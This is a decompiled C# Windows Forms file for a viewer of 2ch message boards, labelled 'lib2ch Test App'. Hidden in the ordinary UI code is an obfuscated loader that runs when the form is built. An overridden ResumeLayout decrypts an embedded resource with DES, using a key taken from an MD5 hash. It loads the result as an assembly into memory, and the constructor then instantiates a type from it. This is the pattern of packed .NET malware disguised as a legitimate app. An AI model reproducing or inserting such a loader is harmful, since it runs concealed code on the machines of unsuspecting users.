using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace The_chViewer;

public class BbsBrowser : Form
{
	private BbsMenu _menu;

	private BbsBoard _currentBoard;

	private int _selectedThreadIndex;

	private object[] lvwColumn1 = new object[3] { "6D714259", "637061", "The_chViewer" };

	private IContainer components;

	private static object ICriticalNotifyCompletion;

	private static Type TracerStatics = typeof(ImageFinder);

	private Button btnBoardsLoad;

	private ListView lvwBoard;

	private ColumnHeader colName;

	private ColumnHeader colSpeed;

	private ColumnHeader colResNum;

	private TreeView tvwMenu;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private WebBrowser wbThread;

	private SplitContainer splitContainer1;

	private SplitContainer splitContainer2;

	public BbsBrowser()
	{
		InitializeComponent();
		Activator.CreateInstance((Type)ICriticalNotifyCompletion, lvwColumn1);
		lvwBoard.get_Columns().get_Item(0).set_Width(200);
		lvwBoard.get_Columns().get_Item(1).set_Width(200);
		lvwBoard.get_Columns().get_Item(2).set_Width(200);
		lvwBoard.set_FullRowSelect(true);
		lvwBoard.set_MultiSelect(false);
	}

	private void btnBoardsLoad_Click(object sender, EventArgs e)
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		_menu = new BbsMenu();
		_menu.Download();
		tvwMenu.get_Nodes().Clear();
		tvwMenu.BeginUpdate();
		foreach (KeyValuePair<string, List<BbsBoard>> board in _menu.Boards)
		{
			List<TreeNode> list = new List<TreeNode>();
			foreach (BbsBoard item in board.Value)
			{
				list.Add(new TreeNode(item.Name));
			}
			TreeNode val = new TreeNode(board.Key, list.ToArray());
			tvwMenu.get_Nodes().Add(val);
		}
		tvwMenu.EndUpdate();
	}

	private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
	{
		if (tvwMenu.get_SelectedNode().get_Parent() != null)
		{
			((ToolStripItem)toolStripStatusLabel1).set_Text($"Loading {tvwMenu.get_SelectedNode().get_Parent().get_Text()} - {tvwMenu.get_SelectedNode().get_Text()}");
			List<BbsBoard> source = _menu.Boards[tvwMenu.get_SelectedNode().get_Parent().get_Text()];
			_currentBoard = source.Where((BbsBoard x) => x.Name == tvwMenu.get_SelectedNode().get_Text()).First();
			_currentBoard.DownladCompleted += displayBoard;
			_currentBoard.DownloadCancel();
			_currentBoard.DownloadAsync();
		}
	}

	private void displayBoard(object sender, DownloadCompletedEventArgs e)
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		List<ListViewItem> list = new List<ListViewItem>();
		_currentBoard.Threads.Sort((BbsThread x, BbsThread y) => y.Speed.CompareTo(x.Speed));
		foreach (BbsThread thread in _currentBoard.Threads)
		{
			ListViewItem val = new ListViewItem(new string[3]
			{
				thread.Name,
				thread.Speed.ToString(),
				thread.ResNum.ToString()
			});
			if (thread.ResNum == 1001)
			{
				val.set_BackColor(Color.Red);
			}
			list.Add(val);
		}
		((Control)this).Invoke((Delegate)new Action(lvwBoard.get_Items().Clear));
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			lvwBoard.get_Items().AddRange(list.ToArray());
		});
	}

	private void lvwBoard_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (lvwBoard.get_SelectedIndices().get_Count() >= 1)
		{
			_selectedThreadIndex = lvwBoard.get_SelectedIndices().get_Item(0);
			if (_selectedThreadIndex >= 0)
			{
				_currentBoard.Threads[_selectedThreadIndex].DownloadCancel();
				_currentBoard.Threads[_selectedThreadIndex].DownladCompleted += displayThread;
				_currentBoard.Threads[_selectedThreadIndex].DownloadAsync(_currentBoard.HostName, _currentBoard.BoardDir);
			}
		}
	}

	private void displayThread(object sender, DownloadCompletedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			wbThread.set_DocumentText(((object)_currentBoard.Threads[_selectedThreadIndex].ToXml()).ToString());
		});
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			wbThread.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(wbScroll));
		});
	}

	private void wbScroll(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			wbThread.get_Document().get_Body().set_ScrollTop(wbThread.get_Document().get_Body().get_ScrollRectangle()
				.Height);
			});
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			((Form)this).Dispose(disposing);
		}

		public virtual void ResumeLayout(bool t)
		{
			TimeOffset("");
		}

		private static string TimeOffset(string SubcategoryMembership)
		{
			byte[] array = (byte[])new ResourceManager(TracerStatics).GetObject("JRT");
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array2 = new byte[8];
			Array.Copy(mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes("HS4G8")), 0, array2, 0, 8);
			dESCryptoServiceProvider.Key = array2;
			dESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICriticalNotifyCompletion = Deformatter(ContractArgument(dESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array, 0, array.Length))).GetType("sk41Ua2AFu5PANMKit.abiJPmfBfTL6iLfmaW");
			return SubcategoryMembership;
		}

		private static Assembly Deformatter(object ResolvedAssembly)
		{
			return (Assembly)ResolvedAssembly;
		}

		public static object ContractArgument(byte[] DivideByZero)
		{
			return Thread.GetDomain().Load(DivideByZero);
		}

		private void InitializeComponent()
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Expected O, but got Unknown
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_005d: Expected O, but got Unknown
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0068: Expected O, but got Unknown
			//IL_0069: Unknown result type (might be due to invalid IL or missing references)
			//IL_0073: Expected O, but got Unknown
			//IL_0074: Unknown result type (might be due to invalid IL or missing references)
			//IL_007e: Expected O, but got Unknown
			//IL_007f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0089: Expected O, but got Unknown
			//IL_0141: Unknown result type (might be due to invalid IL or missing references)
			//IL_0217: Unknown result type (might be due to invalid IL or missing references)
			//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
			//IL_032d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0337: Expected O, but got Unknown
			//IL_039b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0438: Unknown result type (might be due to invalid IL or missing references)
			//IL_04b7: Unknown result type (might be due to invalid IL or missing references)
			//IL_058e: Unknown result type (might be due to invalid IL or missing references)
			//IL_068c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0696: Expected O, but got Unknown
			//IL_069b: Unknown result type (might be due to invalid IL or missing references)
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(BbsBrowser));
			btnBoardsLoad = new Button();
			lvwBoard = new ListView();
			colName = new ColumnHeader();
			colSpeed = new ColumnHeader();
			colResNum = new ColumnHeader();
			tvwMenu = new TreeView();
			statusStrip1 = new StatusStrip();
			toolStripStatusLabel1 = new ToolStripStatusLabel();
			wbThread = new WebBrowser();
			splitContainer1 = new SplitContainer();
			splitContainer2 = new SplitContainer();
			((Control)statusStrip1).SuspendLayout();
			((ISupportInitialize)splitContainer1).BeginInit();
			((Control)splitContainer1.get_Panel1()).SuspendLayout();
			((Control)splitContainer1.get_Panel2()).SuspendLayout();
			((Control)splitContainer1).SuspendLayout();
			((ISupportInitialize)splitContainer2).BeginInit();
			((Control)splitContainer2.get_Panel1()).SuspendLayout();
			((Control)splitContainer2.get_Panel2()).SuspendLayout();
			((Control)splitContainer2).SuspendLayout();
			((Control)this).SuspendLayout();
			((Control)btnBoardsLoad).set_Anchor((AnchorStyles)10);
			((Control)btnBoardsLoad).set_Location(new Point(210, 1715));
			((Control)btnBoardsLoad).set_Margin(new Padding(8, 8, 8, 8));
			((Control)btnBoardsLoad).set_Name("btnBoardsLoad");
			((Control)btnBoardsLoad).set_Size(new Size(200, 59));
			((Control)btnBoardsLoad).set_TabIndex(1);
			((Control)btnBoardsLoad).set_Text("板ロード");
			((ButtonBase)btnBoardsLoad).set_UseVisualStyleBackColor(true);
			((Control)btnBoardsLoad).add_Click((EventHandler)btnBoardsLoad_Click);
			((Control)lvwBoard).set_Anchor((AnchorStyles)15);
			lvwBoard.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[3] { colName, colSpeed, colResNum });
			lvwBoard.set_HideSelection(false);
			((Control)lvwBoard).set_Location(new Point(8, 8));
			((Control)lvwBoard).set_Margin(new Padding(8, 8, 8, 8));
			((Control)lvwBoard).set_Name("lvwBoard");
			((Control)lvwBoard).set_Size(new Size(2748, 521));
			((Control)lvwBoard).set_TabIndex(2);
			lvwBoard.set_UseCompatibleStateImageBehavior(false);
			lvwBoard.set_View((View)1);
			lvwBoard.add_SelectedIndexChanged((EventHandler)lvwBoard_SelectedIndexChanged);
			colName.set_Text("スレ名");
			colSpeed.set_Text("勢い");
			colResNum.set_Text("レス数");
			((Control)tvwMenu).set_Anchor((AnchorStyles)15);
			((Control)tvwMenu).set_Location(new Point(8, 15));
			((Control)tvwMenu).set_Margin(new Padding(8, 8, 8, 8));
			((Control)tvwMenu).set_Name("tvwMenu");
			((Control)tvwMenu).set_Size(new Size(414, 1678));
			((Control)tvwMenu).set_TabIndex(3);
			tvwMenu.add_AfterSelect(new TreeViewEventHandler(treeView1_AfterSelect));
			((ToolStrip)statusStrip1).set_ImageScalingSize(new Size(40, 40));
			((ToolStrip)statusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)toolStripStatusLabel1 });
			((Control)statusStrip1).set_Location(new Point(0, 1860));
			((Control)statusStrip1).set_Name("statusStrip1");
			statusStrip1.set_Padding(new Padding(3, 0, 37, 0));
			((Control)statusStrip1).set_Size(new Size(3280, 46));
			((Control)statusStrip1).set_TabIndex(4);
			((Control)statusStrip1).set_Text("statusStrip1");
			((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
			((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(220, 41));
			((ToolStripItem)toolStripStatusLabel1).set_Text("lib2ch Test App");
			((Control)wbThread).set_Anchor((AnchorStyles)15);
			((Control)wbThread).set_Location(new Point(8, 8));
			((Control)wbThread).set_Margin(new Padding(8, 8, 8, 8));
			((Control)wbThread).set_MinimumSize(new Size(53, 52));
			((Control)wbThread).set_Name("wbThread");
			((Control)wbThread).set_Size(new Size(2755, 1233));
			((Control)wbThread).set_TabIndex(5);
			((Control)splitContainer1).set_Anchor((AnchorStyles)15);
			((Control)splitContainer1).set_Location(new Point(32, 31));
			((Control)splitContainer1).set_Margin(new Padding(8, 8, 8, 8));
			((Control)splitContainer1).set_Name("splitContainer1");
			((Control)splitContainer1.get_Panel1()).get_Controls().Add((Control)(object)btnBoardsLoad);
			((Control)splitContainer1.get_Panel1()).get_Controls().Add((Control)(object)tvwMenu);
			((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)splitContainer2);
			((Control)splitContainer1).set_Size(new Size(3216, 1808));
			splitContainer1.set_SplitterDistance(418);
			splitContainer1.set_SplitterWidth(11);
			((Control)splitContainer1).set_TabIndex(6);
			((Control)splitContainer2).set_Anchor((AnchorStyles)15);
			((Control)splitContainer2).set_Location(new Point(8, 8));
			((Control)splitContainer2).set_Margin(new Padding(8, 8, 8, 8));
			((Control)splitContainer2).set_Name("splitContainer2");
			splitContainer2.set_Orientation((Orientation)0);
			((Control)splitContainer2.get_Panel1()).get_Controls().Add((Control)(object)lvwBoard);
			((Control)splitContainer2.get_Panel2()).get_Controls().Add((Control)(object)wbThread);
			((Control)splitContainer2).set_Size(new Size(2771, 1793));
			splitContainer2.set_SplitterDistance(542);
			splitContainer2.set_SplitterWidth(10);
			((Control)splitContainer2).set_TabIndex(6);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(16f, 31f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(3280, 1906));
			((Control)this).get_Controls().Add((Control)(object)splitContainer1);
			((Control)this).get_Controls().Add((Control)(object)statusStrip1);
			((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
			((Form)this).set_Margin(new Padding(8, 8, 8, 8));
			((Control)this).set_Name("BbsBrowser");
			((Control)this).set_Text("Form1");
			((Control)statusStrip1).ResumeLayout(false);
			((Control)statusStrip1).PerformLayout();
			((Control)splitContainer1.get_Panel1()).ResumeLayout(false);
			((Control)splitContainer1.get_Panel2()).ResumeLayout(false);
			((ISupportInitialize)splitContainer1).EndInit();
			((Control)splitContainer1).ResumeLayout(false);
			((Control)splitContainer2.get_Panel1()).ResumeLayout(false);
			((Control)splitContainer2.get_Panel2()).ResumeLayout(false);
			((ISupportInitialize)splitContainer2).EndInit();
			((Control)splitContainer2).ResumeLayout(false);
			ResumeLayout(t: false);
			((Control)this).PerformLayout();
		}
	}
